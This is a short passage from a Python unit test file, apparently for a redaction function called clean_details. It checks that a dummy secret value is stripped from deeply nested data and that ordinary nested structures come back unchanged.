        self.assertNotIn("AnotherSecretValue1", json.dumps(P.clean_details(deep)))

    def test_ordinary_nesting_is_unchanged(self):
        v = {"a": [{"b": [1, 2, {"c": "hello"}]}]}
        self.assertEqual(P.clean_details(v), v)
